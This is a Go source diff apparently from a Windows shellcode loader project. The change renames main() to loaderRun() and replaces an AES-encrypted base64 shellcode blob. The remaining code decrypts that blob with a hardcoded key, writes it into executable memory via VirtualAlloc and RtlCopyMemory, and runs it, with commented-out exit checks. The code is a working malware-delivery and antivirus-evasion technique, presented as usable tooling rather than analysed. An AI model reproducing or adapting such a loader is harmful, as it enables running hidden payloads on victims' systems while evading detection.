@@ -60,10 +60,9 @@ var (
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
-func main() {
-
+func loaderRun() {
 	utils.Gotest01()
-	shellcodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMCFkXRERMWoBZks6rZIJKph/Ll089kMCvNmuCkKbmXfQ2nrUUcngeGOqMZ7/4lrxex0xnlzTV+t0upALOISlnSo0QIFJDauXoOcMEM2Uf5UYp75SrOfi3254SsAT74r2ytAxf/gmmTSxG8EPLh1foqiF2TxJHI8DvG6VWrgn25oedUqiz3v3HZc52RcGSpU7fYVQ7NuaevdE9CfKxkQVJoq1xfZtv49OgixIRrz8EPg9J0FJBZyyvtnWTgoUZ+PRkgvB3+bNI1dxlO4kC2GpRpFUZZ6+he3VqPKCdPEKD5VPso3+BjGSUv+c1WfgfuyVz+6A7U7taEiFsYQKMcLKgm51DUvBpM9gG1d/85/a+XcCpqzVM8qcJXSc8WNmcdP+LSIsrbD4MUr7EK6xTscUPO2B9rOXkQ9s2mw3WrH1JBNX1deW/RDmH8l8MxcaHy7Vh88wW3X8+kzv/1wAqDsQ9GE0O0HNzzLFUfenAGBCVIEebdZwRWFc8VRourg1O0kCtNN6BSOMIOc2CBLU/dNfqLMchEDPCqUpL/PRfVzEl84GH6KHaTYaQd2ALoIEfyHzaXgI2r9CCJiy+v8C+SijbwIAUoMsyRZh66xtRLmhsMbDOYPcSByj8c/r0zKedY74ueWOAQEIpQ1Aku3JOBnUWZzDYV1cJjY5Naf45oFb+CjJcEnp8ud3rr60WReyPye26h474BdhsXW7aim8KA4dTf2nh8nc04A5diybtdy3ADR9jUh6oSNLaATOKrcDM9KnwHPFFZZRtPgmii+RScmw18tqHUsCZrsZHUW1EvuRnxZunO36uItJnBf3PhGbhU6eNVaXR3lacjzUEz1k411GdBwVqbkSWBBHC0/m80/k5G0wKx962EHGjVWBOS770N/pQ=="
+	shellcodeAesBast64 := "OPQI9JGoMh9g/LTZ9ShH2jXalCpYJxoViYIYgOLN7jUlyqxZK1yGb/tm8dSfkpfAoGmc7Btms/519YS5CquBCebtM76wUS8ahc6hL2lQsxLJnZvIDCnply6UEzv4uaD6lmJapOFSaiTrftm4euGllupnGdqevihQPM34U6Q5tGul0u5O0NVu6iAw+UXAgCFTlGFG68mS4L/moRbHOHkoLccG3t41dyQRQ0xKX+oEO/w6v28I9cIFb26hrj3T5pAST8ZYvNjfLLFhYanGnKZbv9vFSA79iP8asxRVMUS/qdO+Wbnq72CMmDjjCghpeblA8XVRmExNUm4YN7Q9GOp5BMCFkXRERMWoBZks6rZIJKph/Ll089kMCvNmuCkKbmXfQ2nrUUcngeGOqMZ7/4lrxex0xnlzTV+t0upALOISlnSo0QIFJDauXoOcMEM2Uf5UYp75SrOfi3254SsAT74r2ytAxf/gmmTSxG8EPLh1foqiF2TxJHI8DvG6VWrgn25oedUqiz3v3HZc52RcGSpU7fYVQ7NuaevdE9CfKxkQVJorpSR68wkQMcLmr+itKVZne6CGkSVef7c6kZlCXeqqtrcVg76wNM96XtqiAlhuONnhUxJgCjfK8Cc1eSMd+fqcG25VPSbAnmlw2QDAB7rdCo3fgi6qnRrVdnLoEMgsBsNdWoO42fmnNW5ecPI5xnte5y98KY1SWGXyXUpuDikqzngQcTToETVNRvxpkCl6xBhUXkV3N5wxgJ5vMV44RFhoIW077bzJhircsS1w79TSvyIG3iKoqyZeEXreQuInT9O8I7xnN7V3PDHjgpxw3ij6uPvLVUuqMxM18FRE9i4LfszEHEI+OqgdeasRihvaThFVIhESALru/AVEgZIZhsqKZb8G7+a/ejW3xsn76uUg5L5RcA0WEfvbOuxdN7ikbuMzWBzjcHmsFQaEAInNjMSgGwqoEquH4Rb9z78x3UdE9fj7r9BkmvqPvh+nogbHaxF/uRE3BFZgUx35E/Osr5gIpvCWnp8qqCb26D8h0jvYvaR070VDyxbSbWYX13um/7hExCrtuKGGSJtr2SYG0u2D9PuaA5d9Uz13GLnudU2MZX6ea8jbBr3hoz+bqBhApA5JBWfcNj3LUokSlPkcogyjr6YBpBd2Cp7liUsIPV21JZbfKpv2kQwsrGYR8reDkVCbLz8saaaJrx+y328bNLUt+qEMfNVCZihOqSYZx4HL6g=="
 
 	shellcode, _ := AesDecrypt(shellcodeAesBast64, []byte("woshikeywoshikey"))
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
@@ -74,7 +73,6 @@ func main() {
 	//if err != nil && err.Error() != "The operation completed successfully." {
 	//	syscall.Exit(0)
 	//}
-	log.Println(456)
 	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	//if err != nil && err.Error() != "The operation completed successfully." {
 	//	syscall.Exit(0)
@@ -83,5 +81,6 @@ func main() {
 		log.Println(err)
 		//syscall.Exit(0)
 	}
+
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
